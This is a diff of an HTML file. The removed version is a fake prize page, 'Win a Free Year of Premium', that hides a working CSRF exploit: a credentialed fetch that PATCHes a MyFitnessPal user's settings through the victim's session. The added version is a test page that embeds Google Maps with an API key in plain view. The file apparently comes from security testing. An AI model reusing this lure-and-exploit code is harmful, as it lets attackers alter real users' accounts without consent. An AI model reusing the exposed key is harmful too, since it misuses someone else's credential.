@@ -1,65 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Win a Free Year of Premium!</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        button { font-size: 1.5em; padding: 15px 30px; cursor: pointer; }
-        #status { margin-top: 20px; font-weight: bold; }
-    </style>
-</head>
-<body>
-
-    <h1>🎉 Congratulations! 🎉</h1>
-    <p>You've been selected for a FREE 1-year MyFitnessPal Premium subscription!</p>
-    <p>Click the button below to claim your prize instantly.</p>
-
-    <button onclick="claimPrize()">Claim My Free Premium!</button>
-
-    <div id="status"></div>
-
-    <script>
-        function claimPrize() {
-            document.getElementById('status').innerText = "Processing... Please wait.";
-
-            // This is the malicious payload that will be sent to MyFitnessPal
-            const maliciousData = {
-                "item": {
-                    "location_preferences": {
-                        // We change the timezone to something noticeable
-                        "time_zone": "Antarctica/South_Pole" 
-                    }
-                }
-            };
-
-            fetch('https://www.myfitnesspal.com/api/services/users', {
-                method: 'PATCH',
-                headers: {
-                    'Content-Type': 'application/json',
-                    // The browser will automatically add the Origin: https://evil.com header
-                },
-                body: JSON.stringify(maliciousData),
-                // This is the crucial part! It tells the browser to send the victim's
-                // cookies (like the session token) along with the request.
-                credentials: 'include' 
-            })
-            .then(response => {
-                if (response.ok) {
-                    // If the request succeeds, it means the attack worked.
-                    document.getElementById('status').innerText = "Success! Your prize has been activated.";
-                    console.log("CSRF Attack Successful! Response:", response);
-                } else {
-                    document.getElementById('status').innerText = "An error occurred. Please try again.";
-                    console.error("CSRF Attack Failed. Response:", response);
-                }
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = "Network error. Please check your connection.";
-                console.error("CSRF Attack Error:", error);
-            });
-        }
-    </script>
-
-</body>
+<html>
+  <head>
+    <title>Test Google Maps API Key</title>
+  </head>
+  <body>
+    <iframe
+      width="600"
+      height="450"
+      style="border:0"
+      loading="lazy"
+      allowfullscreen
+      referrerpolicy="no-referrer-when-downgrade"
+      src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=25.2048,55.2708&zoom=15">
+    </iframe>
+  </body>
 </html>
